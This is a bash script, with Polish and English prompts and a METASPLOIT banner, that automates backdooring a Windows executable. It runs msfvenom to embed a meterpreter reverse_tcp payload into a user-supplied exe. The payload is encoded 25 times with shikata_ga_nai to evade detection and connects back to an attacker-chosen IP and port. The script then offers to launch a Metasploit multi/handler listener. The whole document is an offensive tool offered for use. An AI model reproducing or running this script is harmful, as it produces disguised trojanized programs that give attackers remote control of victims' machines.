#! /bin/bash
# METASPLOIT AUTOMATIC SCRIPT INJECT PAYLOAD TO EXE FILE
echo "

 ███▄ ▄███▓▓█████▄▄▄█████▓ ▄▄▄        ██████  ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓
▓██▒▀█▀ ██▒▓█   ▀▓  ██▒ ▓▒▒████▄    ▒██    ▒ ▓██░  ██▒▓██▒    ▒██▒  ██▒▓██▒▓  ██▒ ▓▒
▓██    ▓██░▒███  ▒ ▓██░ ▒░▒██  ▀█▄  ░ ▓██▄   ▓██░ ██▓▒▒██░    ▒██░  ██▒▒██▒▒ ▓██░ ▒░
▒██    ▒██ ▒▓█  ▄░ ▓██▓ ░ ░██▄▄▄▄██   ▒   ██▒▒██▄█▓▒ ▒▒██░    ▒██   ██░░██░░ ▓██▓ ░ 
▒██▒   ░██▒░▒████▒ ▒██▒ ░  ▓█   ▓██▒▒██████▒▒▒██▒ ░  ░░██████▒░ ████▓▒░░██░  ▒██▒ ░ 
░ ▒░   ░  ░░░ ▒░ ░ ▒ ░░    ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▓    ▒ ░░   
░  ░      ░ ░ ░  ░   ░      ▒   ▒▒ ░░ ░▒  ░ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ▒ ░    ░    
░      ░      ░    ░        ░   ▒   ░  ░  ░  ░░         ░ ░   ░ ░ ░ ▒   ▒ ░  ░      
       ░      ░  ░              ░  ░      ░               ░  ░    ░ ░   ░                                                                                              
"
echo "Startuję skrypt ..."
read -r -p "Input exe file patch - " LOKALIZACJA
echo "Moving file to /home/kali/Desktop/ ..."
mv $LOKALIZACJA /home/kali/Desktop/
cd /home/kali/Desktop
read -r -p "Input the name of exe file - " NAZWA
read -r -p "Input the payload IP adress - " IP
read -r -p "Input the payload port - " PORT
read -r -p "Input the payload name - " LADUNEK
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai -i 25 -k -x /home/kali/Desktop/$NAZWA.exe LHOST=$IP LPORT=$PORT >$LADUNEK.exe
while true
do
 read -r -p "Do you want start metasploit ? (y/n) - " ODPOWIEDZ
 
 case $ODPOWIEDZ in
     [y][eE][sS]|[y])
  echo "Uruchamiam skrypt... "
  sleep 3
  sudo msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp'
  sudo ./K0Z1OLMENU.sh
 break
 ;;
     [n][eE][sS]|[n])
 break
        ;;
     *)
 echo "Invalid input..."
 ;;
  esac
done
while true
do
 read -r -p "Do you want start script again ? (y/n) - " ODPOWIEDZ2
 
 case $ODPOWIEDZ2 in
     [y][eE][sS]|[y])
  echo "Uruchamiam skrypt... "
  cd ..
  sudo ./K0Z1OLMENU.sh
 break
 ;;
     [n][eE][sS]|[n])
  echo "Thanks for using my script !"
  exit 1
 break
        ;;
     *)
 echo "Invalid input..."
 ;;
  esac
done
